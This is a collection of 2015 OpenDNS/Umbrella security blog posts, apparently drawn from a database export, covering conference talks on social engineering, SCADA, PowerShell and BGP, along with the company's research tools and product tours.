Sandvik and Michael Auger showcased their ability to hack a WiFi-enabled rifle, further proving the lack of security in IoT.\nFire Up Your Ham Radios, Hackers Are Going Old School\nFinally, one seemingly unassuming trend was evident at all three conferences: the idea of attacks using what may be considered outdated or obvious methods. The staggering amount of talks involving radios lends credence to this. BSidesLV hosted several radio-focused talks, including I Amateur Radio (And So Can You!) by Kat Sweet, and All Your RFz Are Belong to Me – Software Defined Radio Exploits from Balint Seeber.\nAnother security issue that found audiences at all three events was the prevalence and success of online scams, such as phishing and malvertising. At DEF CON, Mark Ryan Talabis discussed how malicious publishers were using “hidden ads, ad stacking, intrusive ads, auto-refreshes, popups, popunders, blackhat SEO techniques and dirty inventory” to trick users. Markus Jakobsson & Ting-Fang Yen also delved into the world of online scams at Blackhat, specifically pointing to the staggering statistics: more than 10 percent of Americans fall victim to scams every year. Other presentations covered steganography, DoS, and XSLT attacks.\n\nAll of the topics that make it to the stage at Blackhat, DEF CON, and BSidesLV are worthy of serious consideration from the industry.

We also monitor about 10.1 million daily HTTP traffic requests on our proxy, which is maintained by our awesome Cloud Enforcement Team. Since this is a relatively new data set for us, building new data pipelines and processing proper metrics is an important step to gaining visibility and building intuitions about the data. With this in mind, we have created Poseidon, a statistics tool to monitor the network behavior on our proxy.\nThe primary purpose of Poseidon is to process the HTTP logs ingested from our Kafka stream and provide meaningful metrics in order to gain actionable insights over a sliding one-hour window. Some of the statistics it displays are top non-blocked domains, blocked URLs counts, and a trending system over the past hour (updating every five minutes).\nPoseidon’s trending system is based on time series analysis algorithms. We take the relative average standard deviation per domain over the last hour, then sort through these domains by trending score to obtain the top trending domains and URLs in the observed window (60 minutes), and identify items with the sharpest trends for deeper inspection.\nFigure 1 is an overview of how Poseidon’s windowing system works:\n(Figure 1)\n\nPoseidon provides supplemental data for our researchers by retrieving classification data from Investigate, for example specific threat attribution scores (e.g., ASN scores, IP scores, and DGA scores). We have also created a display for time series data in a histogram to see the traffic behavior within the time window. Poseidon also monitors and generates statistics for OpenDNS’s new IP blocking feature.\nFigure 2 is an example of time series histogram, where we can observe the overall counts over the last 1 hr. along with each 5 min. intervals, this helps with identifying sharp changes in traffic and network behavior:\n(Figure 2)\n\nSome of the other fields in the proxy traffic that we are conducting analysis on are the HTTP Referer and User-Agent fields. For example, if there was a specific referer sending users to multiple malicious pages, this may be suspicious. We have deployed a set of rules to match malicious user-agent strings, and have also tied in useragentstring.com’s API to help identify and analyze unknown user-agents.\nFigures 3 and 4 are screenshots of Poseidon displaying top-counts and displaying overall trending. From this data we can examine user behavior, trends in traffic, and identify outliers in the data:\n(Figure 3)\n\n(Figure 4)\nThe next step for the development of Poseidon is to rebuild it with an analytics platform like Apache Spark to distribute the computations as we deploy more rules, build HTTP detection models, and harvest more network statistics. In addition, we can proxy traffic for domains found from our DNS models and gain more information about them at the HTTP level. This will also be attached to our email alert system in order to send out daily digests of proxy statistics to the team for more in-depth analysis.\nUsing Poseidon, OpenDNS Security Labs increases its ability to detect new and emerging threats. As we discover suspicious domains from our proprietary DNS models, we can selectively proxy the traffic to gain greater insight – including subdomains, paths, filenames, and file extensions. Any identified indicators can then be fed back into our existing threat models, training sets, and alerting systems. The discovered indicators may also serve as the basis for the creation of new threat models or an entirely new vein of research.\nThese are exciting times in the OpenDNS Security Labs.

For this hackathon, the data visualization team created a new timeline visualization.\nThe idea for the project came from some internal interviews with the research team. The purpose of these interviews were to understand the researchers’ typical workflow and uncover their need toward the data stored within OpenDNS Security Graph. To give a little more context, Security Graph is a tool built by the Security Labs team, sourced from 70+ billion DNS requests that OpenDNS handles each day. Given the size of data, however, one ongoing challenge is deciding how we can represent the data in a manner that will make the work of security researchers and analysts easier. The interviews gave us a number of great insights. One key finding was that the team would like to have a quick view of the important events for a particular domain in addition to how the features evolve over time. The reason for this is that malicious behavior may surface if visualized correctly and succinctly.\nThis finding led us to the idea of creating a timeline visualization. Our goal was to answer the question, “What does the life of a domain look like?” More specifically, our project would visualize the time stamps – including key events and turning points for a domain – whenever it changes (e.g., created or updated) its IP address or name server. The design is guided by Shneiderman’s Mantra of data visualization: Overview First, Zoom and Filter, then Details-on-Demand. The timeline gives the user a look at the whole history of a domain, zoom in and out, and the ability to select the dataset of interest. Furthermore, the user can click on every event on the timeline to expand it and view more detail.\nTo do all this, we selected two JavaScript libraries: D3  and EventDrops. The former is a popular data visualization library, which is suited to create a dynamic and interactive visualization; the latter is another visualization library, but based on D3. EventDrops draws a zoomable, clickable timeline, representing events as circles. We modified the original source code a little to realize every function that we wanted to add.\nHere is a very good image of what the timeline looks like from the original repository.\n\nWith the original design and prepared libraries at hand, we developed everything within that single day. The following two images show how we did and what we made: the whole process flow, and our timeline visualization. As you may notice from Figure 1, all data directly comes from our Investigate APIs.\n\nFigure 1. Process Flow\n\nFigure 2. Timeline Visualization\nIn Figure 2, “Key Events” displays the dates when events including the target domain occur. For example, the domain is registered, updated, or tagged by OpenDNS. “IP Addresses” represents historical records of the domain, so that the user can see how frequently the domain has changed its IP addresses over a certain period. (Note: as of today, windows7download.com is in our block list and considered as a malicious domain. Please do not attempt to browse to it).\nDuring the development, we faced two problems. The first one is overlapping of event circles. This does not matter so much as long as two events do not happen at the exact same time since the visualization supports zoom-in. Yet hours and minutes are not always available in the data, which means that two events will be regarded to occur at the same time if the date is only available. The second problem is that it was hard to represent the start and end dates of an event. If we simply used a rectangle or line to represent this, another overlapping issue would come up here too. That is, multiple rectangles or lines may overlap with each other and it may be difficult to distinguish when the event starts or ends exactly.\nSince our visualization was built within a single day, those two above are still remaining issues. Solutions to them will be part of our future work on this project.\nWe hope a new version solves all problems, and this visualization will help customers get a quicker, better insight into a domain’s history.', 'Events;Security Graph;Security Research;Security Tools', 'https://umbrella.cisco.com/blog/2015/08/18/hackathon-visualizing-the-life-of-a-domain/');

Last week the security conference, now in its 23rd year, welcomed attendees, speakers, and press from around the world to LAS Vegas to partake in talks, contests, games, and parties — lots of parties.\nHowever, what is perhaps the conference’s most interesting event is not about flashy code or networking jokes or hardware hacking. It’s just people, hacking…people.\nSince its inception at DEF CON 18, the Social Engineering Capture the Flag (SECTF) contest has been capturing the attention of conference attendees, media, and yes, even the Feds. Chris Hadnagy, Chief Human Hacker at social-engineer.org and one of the organizers of the Social Engineering Village at DEF CON, stated in Vegas that the contest has been awarding winners a black badge from year one, a prize usually reserved for more established competitions that have been around for years. What does a coveted black badge get you? It’s a lifetime pass to DEF CON, and a status symbol in the security community.\nSo what is social engineering, and why has it captured the imagination of so many at DEF CON, and in the wider security industry? Social-engineer.org defines it as “any act that influences a person to take an action that may or may not be in their best interest.”\nSocial engineers exploit the largest weakness in an organization’s security posture: people. Unlike other malicious attacks, human hacking requires very little technical knowledge. Of course, the more you know, the more information you can potentially get from an unsuspecting target. With valuable data in the hands of an unsuspecting company manager or associate, all it takes is a phone call or seemingly innocuous conversation to compromise security — and not just over the phone. Pen testers and criminals alike use social engineering to find their way into restricted areas, even gaining physical access to machines containing sensitive data.\nThe ease of infiltration was on stunning display at DEF CON 23, as the sixth annual SECTF commenced. The contest rules are simple. Contestants are assigned a target company, and a list of “flags” or pieces of information that they need to collect to score points. They then have three weeks to compile an open source, intelligence only report on the company — they “are prohibited from calling, emailing, or contacting the company in ANY way before the DEF CON event.” Once at DEF CON, the participant enters a soundproof booth and has 30 minutes to call into the target company and capture the assigned flags.\nThis year, the black badge winner was Jen Fox, Senior Security Consultant at VioPoint, who masterfully worked her target to achieve not only the highest points in the contest, but perhaps some of the day’s best reactions from the crowd watching. We asked her a few questions about her success in the competition, as well as her opinions on social engineering as a point of compromise:\nHow did you get into Social Engineering, and what led you to compete in the DEF CON SECTF?\nJF: My work in the IT world always had a strong focus on people or processes, so this was a natural evolution as I moved into security. My husband, Steven Fox, convinced me to compete in the SECTF for the first time a few years ago. I did not find the idea of making a phone call in a booth in front of a room full of people at all appealing! I thought the whole process was fascinating, though. It is incredible how much information can be found about a company solely by doing Internet research. Besides the required flag information, I have found badge photos, executive signatures, cultural information, and more.\nYou won this year’s black badge (congrats!). What set you apart from the other contestants?\nJF: Thank you! This was the third year I’ve competed, and I believe the other contestants had limited experience with the competition itself. Based on the other calls I listened to, I think I cut to the chase more quickly and was focused on maximizing flags within the time constraint. Twenty-five minutes seems like plenty of time, but it runs out quickly.  I made sure that the pretext I chose could support all of the flags I needed to get on the call, that I could reference the common language and culture of the company in order to seem more credible and build rapport, and that I had answers to possible questions or objections. All of that came from the research and prep I did over the seven weeks between receiving the initial dossier and getting in the call booth at DEF CON.\nHow has the competition evolved over the three years you’ve been involved?\nJF: Every year is different, thematically. So while the flags have been pretty consistent, the industries have shifted and so do the challenges or constraints each year.  The loopholes for racking up points get smaller each year. For example, in order to get points for a flag more than once, we had to have separate calls. But the rule didn’t say that it had to be a different human. So one contestant called the same person back a second time and got them to re-confirm information flags. (I see a new rule coming!) In previous years, we could get credit multiple times for a flag on the same call with the same person. So as the contestants “hack” the rules within the competition, the competition rules evolve.\nAs evidenced by the results of the DEF CON SECTF, it’s fairly apparent that gender often plays a role in social engineering. Why do you think this is the case?\nJF: I’ve seen social engineers of both genders do skilled work – I think it’s more about how the person relates to and interacts with the target that predicts success. That being said, men and women generally have different ways of interpreting and communicating information and relating to others, and so may end up with an edge in certain social engineering situations. Women – come on out and join these contests! It’s a great opportunity to learn and participate!\nGenerally speaking, why has social engineering risen to prominence in the security industry?\nJF: High visibility breaches are in the news almost constantly, and social engineering figures into many of those breaches. Plus, one thing that all security professionals seem to agree upon is that humans are the most porous part of our security perimeters. So where we can tell a tool to never allow a “.exe” attachment through and it won’t, humans get distracted, make mistakes, want to be helpful, and on and on. This is what social engineers take advantage of.\nWhat can people do to protect themselves from malicious social engineers?\nJF: If you’re being solicited for information that seems odd or intrusive, find a way that is comfortable for you to say “no,” or create a break in the process by asking to call back after you verify details of the request or caller. Companies can use this as an opportunity to create “scripts” for employees to decline or escalate certain types of requests while maintaining their brand or customer service approach.\nWhat advice do you have for people who would like to get involved in social engineering?\nJF: I highly recommend the SECTF as a great learning experience; there are SECTFs at other conferences, too, so check around. I think [they] are great learning opportunities because they’re realistic but also structured. There are also classes, as well as a number of good books on the topic.

Just behind Larsen, two 55-gallon drums hooked to hoses and electrical lines monitoring pressure and temperature were arranged in a way similar to a crude whiskey distillery. Larsen was about to demonstrate his ability to digitally catalyze a change that would result in irreparable, real-world physical damage. It would be a remote hacking version of the simple physics experiment you can find on YouTube.\nJason Larsen’s simple distillery at the ICS village in Defcon 23 demonstrated the physical effects of a hack.\nAccording to Larsen attacks perpetrated remotely in a live environment are never easy. They would take coordinated teams of people, advanced security expertise, and an intimate knowledge of the systems being attacked.\nIn the aftermath of Stuxnet back in 2010, Liam O’Murchu at Symantec was credited with discovering the level of complexity and sophistication in the Stuxnet malware, which also translated to the actual physical attack. “From the SCADA side of things, which is a very specialized area, [the attackers] would have needed the actual physical hardware for testing, and [they would have had to] know how the specific factory floor works,” O’Murchu said in a ComputerWorld interview.\n“The specific factory floor” is important, because–as Larsen demonstrated in his session at Blackhat USA 2015–each environment is unique, and navigating it from a remote location is often done “by feel.”\n“Hollywood has conditioned us to believe that once you’re in the [SCADA] controls, there’s a big red button that says ‘mash the big red button,’ and then things explode,” Larsen said. “In reality you have to analyze the process and build the big red button.”\nAccording to Larsen, the detailed knowledge of controls and processes required to pull off an attack that does physical damage is not easy to acquire, despite the copious descriptions of vulnerable SCADA and ICS infrastructure in the media. In a session at Defcon 23 Larsen and his presenting partner, Senior Security Consultant Marina Krotofil, explained that getting into a system and controlling that system are not nearly the same thing.\nThe two described this misconception in their presentation description, “An attacker targeting a remote process is not immediately gifted with complete knowledge of the process and the means to manipulate it. Exploiting physical process is an exotic and hard to develop skill which have so far kept a high barrier to entry. Therefore real-world control system exploitation has remained in the hands of a few.” In fact, there are only two well-known industrial control attacks to date, the first being Stuxnet and the second an attack that occurred at a German steel mill in January 2015.\nThe aftermath of a remotely initiated change in pressure.\nBut in his controlled environment at the ICS Village, Larsen gave a small but impactful example of what’s at stake. A change in water temperature, resulting in a drastic change in pressure, ends up in an imploded 55-gallon drum. The demonstration leaves a small crowd gathered around the presentation stage gasping at the blowback of air pressure.\nThough they may be extremely difficult, Larsen had provided a live demonstration of what security researchers and SCADA experts have been saying is possible.', 'Blog;Community;Events;Labs Research;News;People & Culture;Security 101', 'https://umbrella.cisco.com/blog/2015/08/12/physical-damage-scada-attacks-easily-theorized-hard-to-execute/');

For example, mining authoritative DNS logs helps establish historical records regarding changes in domain to IP mappings. Furthermore, by examining DNS traffic at the recursive level one can make rough estimates around what malicious sites are rising in popularity. However, despite its usefulness DNS data does have limitations. As solely network data – it does not give the researcher any information about content hosted on a certain domain. To augment our DNS data we have started to incorporate the publicly available SSL and reverse DNS datasets from Rapid7’s internet wide scan. This blog post will discuss the method we use to index the SSL datasets so they are easily queryable for researchers.\nThe SSL dataset consists of a SHA hash of an SSL cert, a Base64 encoding of the cert, the list of IPs associated with the hash, and common names associated with the hash. The reverse DNS data consists of IPs and their DNS ptr records. Each of these datasets also comes with a timestamp from the date of the scan. We decided to use Apache HBase as our storage solution. This was done because the key-value schema-less setup of HBase suited our data modeling requirements and because HBase integrated well with our existing data storage stack.\nApache HBase is a distributed key-value store that is meant for the schema-less storage of data. By schema-less, one means that it does not hold the same degree of rigidity as a SQL schema and can handle new nested columns on the fly. Design of your HBase table can be optimized by knowing what type of query patterns will be most likely asked. We wanted to be able to make the following queries regarding SSL certificates: identify all of the SSL certificates associated with a country’s IP range, view all of the IPs associated with a SSL certificate for either a given date or a range of dates, view the Base64 encoding of a certificate for a given hash. Luckily, these are all questions that can be easily handled by HBase if we carefully construct our table and rowkey.\nA HBase table consists of a rowkey, one or more column families, column qualifiers, and a data cell that contains the value. The ‘key’ portion comes from the rowkey. The rowkey serves as a primary key in the table. In the case of the questions we want answered we know that our row key will either be a hash value or an IP. However, in our case we cannot have the rowkey consist solely of the hash or IP value. We also wanted the ability to search based on a combination of IP/Hash and a timestamp. Therefore, our row key should also contain a timestamp value and will take the form of [sha:timestamp] where the ‘:’ serves as a delimiter within the rowkey.\n\nThe above figure is an example of the HBase table schema. The arrow indicates that the rowkey points to a set of column qualifiers who each have data stored in their name. The data in this case is the decimal representation of the IP address. Note that we do not use the data cell feature.\nEvery table upon creation requires a column family to be associated with the table. Luckily for us the column family in this case can be given the generic name ‘data’. Nested within the column family are the various column qualifiers. When we are given a (hash,timestamp) pairing as a rowkey and a specified column family we will have each column qualifier represent an IP address that was found to contain the hash. This will create a wide-schema because each IP will receive its own column qualifier associated with the hash, and store a null value in the value cell of the table. We choose this schema because it allows us to quickly retrieve IPs associated with a hash and perform a filter over the column qualifiers.\nIn some cases we will want to use the data cell. For example, the Base64 encoding of the certificate will be stored in a data cell belonging to a column qualifier named ‘cert’. An (IP, timestamp) pairing will utilize a similar table schema. The column qualifier in this case will be hash of the cert found on the requested IP. This HBase schema will allow us to easily scan over IP ranges to retrieve SSL hashes or easily retrieve a given Base64 encoded certificate depending on the hash.

It’s also been proved a number of times that there are flaws in AD that allow attackers to do things like change passwords and escalate their privilege to administrator level.\nBut one of the easiest entry points to an AD server, according to DAn Solutions CTO Sean Metcalf, is built into Windows. PowerShell is a core component of Windows, but as Metcalf demonstrated at Blackhat, utilizing just a few PowerShell tricks allows the use of password hash stealing tools like Mimikatz and the ability to do other things like forge Kerberos tickets. A valid Kerberos ticket, as explained in this post by Lynn Root, provides users with ongoing access to a requested service.\nSean Metcalf demonstrates insecure Kerberos settings during his Blackhat 2015 session.\nWith a “golden ticket,” it’s fairly easy to give yourself admin credentials for any user–even ones that don’t exist–on any domain running Active Directory. But where things get interesting, Metcalf explained to a crowd at Blackhat USA 2015, is when known attacks like pass-the-hash and Mimikatz hash discovery are done in PowerShell.\n“PowerShell is in every version of Windows, and there are a bunch of toolkits for attackers,” Metcalf said. “With Powersploit and other attack tools, attackers can run attacks that don’t get caught by AV or malware detection.”\nSecurity Engineer Joe Bialek demonstrated how this is done during a live hacking session at Defcon 21 in 2013, noting that PowerShell is such a powerful tool (no pun intended) because it can run malicious scripts without ever touching a disk, which means it would not trigger any whitelisting products or any antivirus or malware detection tools.\nMetcalf outlined a number of ways to detect uses of PowerShell and typical persistence behaviors that hackers use in AD. Most importantly, he said, it’s a good idea to use an app logging tool–like SCCM–to log any and all PowerShell activity in AD, as well as set default policies to their strictest setting to only allow authorized administrators the access they need.\nMetcalf also mentioned that AD admins should consider using Microsoft’s Advanced Threat Analytics (ATA), which will ship this month, as it can detect some of the typical behaviors used to compromise and persist control of AD servers and domain controllers.\nThough Metcalf’s talk focused on Powershell and AD persistence methods, it’s a good reminder for security engineers and researchers that even approved, useful tools and software can be subverted for malicious uses.', 'Blog;Events;Labs Research;News;Security 101', 'https://umbrella.cisco.com/blog/2015/08/07/powershell-proves-to-be-an-easy-route-around-ad-security/');

Blackhat USA 2015 featured three sessions on BGP alone, and all three had a unifying reinforcement of truths in BGP. The first is, despite being a backbone of the Internet, BGP is highly insecure–as has been highlighted previously. The second is monitoring remains the main method of finding and reacting to outages and attacks on BGP.\nWim Remes, manager of strategic services at Rapid7, said BGP is both an easy attack vector and a highly important source of information about ongoing attacks. “I think BGP information is very valuable from a threat intelligence perspective,” he said. “Using BGP information to detect when a hijack is occurring is incredibly valuable.”\nBut while there are options for securing BGP like RPKI and BPGSec, these preventative measures do not yet have wide adoption, which means most service and content providers do not protect against leaks and hijacks.\nTo help close the gap in the lacking resources for BGP issues, OpenDNS CTO Dan Hubbard and Network Engineering Manager Andree Toonk announced a free, real-time feed of BGP outages and hijacks called BGP Stream. The tool will utilize BGPmon’s monitoring engine, and cull the largest and most important events, then post those to a Twitter feed. In addition, the tool will provide links to a site where users can find more contextual information about the events, including a live map of BGP outages.\nBGP Outage Map from BGPStream.com\nThe duo also announced DNS Stream, a similar service that will monitor for DNS events and publish them to a Twitter feed. The published events will give indicators to DNS attacks and outages in real-time, just like BGP Stream. Hubbard and Toonk see the two services as complementary to each other and can provide a very useful resource for security professionals and network owners.\nAs far as the choice to publish to Twitter, Hubbard emphasized its social nature and the use of real-time publishing. “Twitter is a great way to announce things, and share data. But it’s also a great way to programmatically consume information.” He also added that he hopes this will be a start of a community that shares and announces issues with BGP and DNS, decreasing the disclosure time and making it easier for companies, network owners, and providers to react quicker to outages.\nOutage message from @BGPStream\nFollow BGP Stream and DNS Stream on Twitter here and here.

According to SANS, honeypots are “setup to be easier prey for intruders than true production systems but with minor system modifications so that their activity can be logged or traced.” These traps often produce a wealth of knowledge security professionals can use to strengthen their defenses.\nDespite the great advantage they provide, however, honeypots are not deployed as widely as the once were. Defenders are busier than ever, and honeypots are complex—specifically, they’re difficult to deploy quickly. As Greg Martin from ThreatStream explained in an article he wrote last week for Power Magazine, “Many organizations see honeypots as too complicated to launch and manage over time, and view them primarily as a tool for security researchers.”\nHoneypots also offer only a limited use case. Lance Spitzer of WindowSecurity.com elaborates on this problem. “Honeypots all share one huge drawback; they are worthless if no one attacks them. Yes, they can accomplish wonderful things, but if the attacker does not send any packets to the honeypot, the honeypot will be blissfully unaware of any unauthorized activity.”\nHaroon Meer, founder and researcher at Thinkst, says honeypots can be a useful tool to be proactive in an era known for large-scale breaches of security. As the public becomes more aware of these security breaches, companies involved need quicker disclosure. Meer says honeypots could be a huge help toward that effort. “We need honeypots to come back because we can’t have people finding out they’re breached because Brian Krebs writes about it,” Meer said during a presentation at BlackHat USA 2015.\nMeer and his presenting partner Marco Slaviero explained that–in addition to the reasons above–honeypots have fallen out of favor for not being “preventative” security solutions. In a cyber arms race, they said, defenders are falling too far behind in terms of tools available. “It’s not an arms race, we’ve already lost,” Meer said. “Just look at OPM.” Honeypots, he explained could be a tool that makes the arms race more competitive.\nAccording to Slaviero and Meer, honeypots are a great addition to any organization’s security posture as “even one alert from a honeypot is valuable.” To prove this value, the two created an enterprise tool called Canary, a series of honeypots that send notifications when attackers hit them. These “canaries” are also specifically designed to entice an attacker to explore further, giving defenders a better profile of who they are dealing with. The pair also discussed the open source version, OpenCanary. OpenCanary is a low-interaction honeypot, which reduces risk and makes it easier to deploy, as it does not use a real OS or applications.\nHoneypots are a good idea Slaviero and Meer said, just “largely ignored by the industry.” With the advent of a new tool like Canary and OpenCanary, this may soon change. As Spitzer commented in his article, “honeypots will not solve an organization’s security problems. Only best practices can do that. However, honeypots may be a tool to help contribute to those best practices.”', 'Blog;Labs Research', 'https://umbrella.cisco.com/blog/2015/08/06/researchers-sweet-on-honeypots-at-blackhat-usa/');

As a backbone protocol of the Internet, whether by mistake or by malicious intent, BGP is capable of halting even the largest Internet sites and services. And while a typical BGP change alert includes useful Autonomous System (AS) information, thousands occur every day and lack any detail about the motive behind the initial change. And according to OpenDNS Network Engineering Manager Andree Toonk, the change process in BGP leaves lots of questions unanswered.\nDuring BGP events, Toonk says, customers have many initial questions including: ‘Did this only affect me?’ and ‘Was it targeted?’ But it can be difficult to find answers to these questions as confirming sources are in short supply. Toonk said he wanted to provide a new, real-time source for answers when BGP goes wrong.\nUpdate tweet from OpenDNS CTO Dan Hubbard\nAlong with a team of OpenDNS engineers and CTO Dan Hubbard, he conceptualized a live stream during a recent hackathon project. Hubbard and Toonk are scheduled to present their work at Blackhat USA 2015 on August 6. Named BGP Stream, the system’s primary function initially will be to post live updates about outages, potential hijacks, and leaks to a Twitter account (@bgpstream).\nAccording to Toonk, an important component to the project was creating a stream of live updates that can help cut out all the noise, since daily changes to BGP measure in the thousands. To help networking professionals and ISPs decide what outages or alerts are important, BGP Stream will use correlating indicators to qualify which events are larger and more important.\n“The big challenge is to figure out if [a change] is normal or not,” Toonk said. “Sometimes a new ASN will pop up and look like a hijack, but it could be normal behavior for an organization that has multiple ASNs.” Analyzing correlating info like whether the ASNs involved are from the same country, or if there is a historical relation between the two, weighed against many other factors, can give good indication to a routing update’s legitimacy.\nFollow @bgpstream on Twitter for updates, and if you are attending Blackhat USA 2015, be sure to attend Hubbard and Toonk’s session on BGP Stream.', 'BGP;Blog;Events;Labs Research;News;Security 101', 'https://umbrella.cisco.com/blog/2015/07/30/bgp-stream-the-emergency-alert-system-for-the-internet/');

We’re constantly iterating and improving the Dashboard experience to make it as seamless and uncomplicated as possible—however, there are a few insider tips and tricks that will help you get even more from Umbrella. We turn again to OpenDNS technical support engineer, Alexander Harrison, for a behind-the-scenes tour of the Umbrella Dashboard:\nOverview:\nAlthough the overview page might seem fairly basic, it can provide a quick look at your network activity and status. According to Harrison, “this is a great overview and health check. Health check in regards to components syncing, and components working, as well as botnet checks, because the daily email reports are actually only good for networks (for now—improvements are on the way!).”\nOne of the most important sections of the Overview page is, helpfully, right at the top. The Message Center is where our engineers and support teams share announcements, particularly big security threats, and outages. Also, if you have components such as the OpenDNS Virtual Appliance, the Message Center will display any related error messages.\n\n“If you have VA components, you should log in at least once a week, to make sure you don’t have any error messages,” Harrison said. “It’s not to say that you will definitely have an issue, it’s just to check and make sure everything is working okay.”\nYou can also find your Activity Volume graph on the Overview page. This graph provides an overview of your traffic volume, and security incidents happening in your network in the last 24 hours. “It’s a great place to see, at a quick glance, what’s going on in your network. Am I seeing a spike in blocks? Am I seeing a spike in malware?” Harrison added one pro tip on reading the graph: “the only confusing thing here is that only the green line represents total traffic—the bars represent different types of security incidents.”\n\nConfiguration:\nThe configuration page is where you can control the settings for your Umbrella deployment. There are three main areas of interest in the Configuration tab:\nPolicies\nWe’ve talked at length about policies and the Policy Editor here, but in short, this section allows you to control what security settings users, groups, and networks receive.\nIdentities\nThe Identities section allows you to add and manage your users. More specifically, it’s where you need to go to download the Roaming Client, add a network or internal network, or provision an iOS device.\nNote: Adding an internal network requires a Virtual Appliance. More on installing the VA here.\nSystem Settings\nFinally, System Settings is the tab where you can manage a slew of account options, including user accounts, delegated admin settings, Active Directory settings, log management, and login settings. It’s also where the Internal Domains settings are located, which are an essential part of managing your Umbrella deployment.\nHarrison comments, “the Internal Domains settings are key—if you are deploying a Roaming Client or Virtual Appliance and you don’t set this up correctly, you will probably run into issues accessing local network resources. These settings will help you route specific domains to your local resolver such as custom local-only domains, preventing long timeouts and general chaos.”\n\n“For example,” he continued, “this is especially important for people who use Exchange. Because Exchange communicates via local subdomain, If you use a local domain email, not setting your Internal Domains will cause things to break.” An article documenting adding autodiscover addresses for Office 365 can be found here.\nReports:\nFinally, the Reports tab, which provides admins with in-depth visibility into their networks. The three most important sections of the Reports page are as follows:\nActivity Search\nThis section provides a real time look into your network activity. The report can be improved by making use of the “Filtering” section, found on the bottom of the left-hand sidebar. (Displayed here on the right.)\n“Say you’re a big company that does a million requests a day,” Harrison said. “You’re going to see a page full of requests from the last minute in Activity Search. But if you use filters, you can quickly and easily pinpoint problem users or domains within the last 28 days. You can even search a specific timeframe, which can be really useful when you’re doing incident response or forensic analysis.” One note with filtering is that these apply only after clicking “Run Report”.\nReports\n“The Reports section houses several helpful things, especially the Security and Cloud Services reports,” according to Harrison.\n\nThe Security Report is almost identical to Activity Search, but specifically shows security events, such as botnet and malware requests, without the noise present in Activity Search. The new Cloud Services report is a great overview of cloud apps and IoT devices in your network. We’ve covered this report extensively on the blog before; read the full explainer by clicking the image below.\n\nAdmin Audit Log\n“The Admin Audit Log shows changes users have made to the Dashboard,” Harrison said. “This is mostly used during internal forensics investigations, or for managerial purposes.”\n\nThe OpenDNS Umbrella Dashboard isn’t quite as challenging as some of the other security dashboards in the market today, however, it still has it’s own best practices to follow. Hopefully, this guide has helped you discover a few of the most important ones, but if you still have questions, you can explore the extensive documentation located in the Knowledge Base, or reach our world-class support team here.', 'Blog;Umbrella', 'https://umbrella.cisco.com/blog/2015/07/23/a-guided-tour-of-the-opendns-umbrella-dashboard/');

Having trouble stopping the kill chain before it even begins? Are you sick of not being able to adequately pivot through a malware attacker’s infrastructure?\nWell, LOOK NO FURTHER! OpenDNS is proud to announce the rerelease of OPENDNS INVESTIGATE!\n\n\nOpenDNS Investigate is a great tool for both Internet Security Researchers and Incident Responders alike for when time is of the essence and you need information NOW! As an employee of OpenDNS, and a proud member of the Security Research Team, I’ve had access to this tool since its creation and I can solemnly say that it has improved my life tenfold and it feels like I’m on vacation every time I use it.\nAll joking aside, the Investigate tool is a great resource that gives you a top-down view of any domain, IP address, ASN or email address that you wish to review and attain more information about. This wonderful tool draws from OpenDNS’s extensive historical data, which becomes very beneficial for reviewing domains whose information may have changed shortly before the attack evaluation.\nOpenDNS Investigate includes information such as geo location, ASN distribution, TTL averages and standard deviations, and IP addresses and Name Servers for a domain, to name a few. There are, however, many other features that are unique to OpenDNS Investigate. For instance, the DNS Query Graph will display the number of queries per hour, specifically pulling from all OpenDNS users over the past 30 days.\n\nSome exclusive features that come with OpenDNS Investigate are the multiple “scores” and colored notification alerts, which are all result dependent. Some of the scores that you will see displayed are as follows:\nSecureRank2 – The ranking of a domain based on the lookup behavior of the client IP for the domain. This score is designed to identify domain names requested by known infected clients but rarely requested by clean clients.\nRIP Score – A score given to a domain based on the IP address (or addresses) it resolves to and the reputation score of the IP address (or addresses). If a domain resolves to an IP or IP range that is considered to have a poor reputation, it will be reflected in this score.\nASN Score – Similar to the RIP Score, however it pertains specifically to ASNs\nRequester Geo Distribution – A score representing the number of queries from clients visiting the domain, broken down by country.\nDGA Score – This score is generated based on the likeliness of the domain name being generated by an algorithm rather than a human. This algorithm is designed to identify domains, which have been created using an automated randomization strategy.\nSecurity Graph Score – A mathematical computation based on the security features and scores that pertain to a domain. Think of this as an overall score based on the rest of the scores listed.\n\nIn addition to the scores, one can also view the Domain Query Handling information for a domain, which shows which types of DNS responses the OpenDNS resolvers provided for the domain in question.\nAnd if I may interject, one of my favorite attributes to look at when reviewing a domain are the Co-Occurrences and Related Domains. The Co-Occurrence domains are domains that have been visited before and after the domain in question. The Related Domains are the domains requested around the same time (up to 60 seconds before or after) as the given domain name, but that are not frequently associated with other domain names. Essentially, it’s the domains that are visited both before and after the domain you’re reviewing.\n\nThe interface for reviewing IP addresses is slightly different, but still comprehensive. The IP Address view is displayed whenever you search on an IP, or when you link to an IP from the Domain View. Generally, the first thing that’s displayed, is information regarding the amount of malicious domains hosted on the IP for the previous week. However, if the IP isn’t hosting any malicious domains, this is also reflected in the results.\n\nThe IP view will also display many other fields such as the LD2 and LD3 domains count (as well as some diversity scores relating to these domains) and the ASNs associated with the IP address. In addition, if the IP address ends up being a Name Server, OpenDNS Investigate will also list the first 1000 domains that the IP is hosting.\n\nThe Investigate tool has officially announced the inclusion of WHOIS information! The WHOIS information listed in Investigate is not gathered by performing a real time WHOIS lookup against another database, but rather from the extensive database maintained by OpenDNS within Investigate. The WHOIS information will show the standard output of registered users or assignees for the domain queried, along with a full range of typical WHOIS data for a domain. When a domain is malicious, additional domain details are displayed regarding the malicious categorization. These are intended to call out attention to particular information that may be useful or relevant to the particular domain that you are researching.

As a board member for OWASP Boston, an advisor to the SOURCE security conference and Director of Information Security at PTC, he regularly evaluates the most cutting-edge new security technologies available. But when Arnold needs the most timely and accurate threat intelligence available, he says that there is one place that he consistently turns.\n“Investigate is very valuable for our team,” says Arnold. “Firstly, it dissects what DNS actually is — it actually takes the protocol apart — and does it in such a way that our team is able to understand every aspect of it. Also, we know that when the data that Investigate uses becomes stale, it’s removed from the system. We want to know what OpenDNS sees in real-time, and Investigate makes that possible.”\n“What OpenDNS sees” is the crux of why Arnold and his team are part of a growing number of infosec professionals who are turning to OpenDNS Investigate as a first — or sometimes, last — source of threat intelligence for their day-to-day security operations. And up until now, access to this product OpenDNS’s massive data was only released in limited availability to a few select customers.\nToday, OpenDNS officially announced that Investigate is generally available to any security professional who, like Arnold, needs better visibility into the global threat landscape with a vantage point that no other security vendor can provide. OpenDNS Investigate is a security search engine that provides query-based and API-driven access to the massive cross-correlated 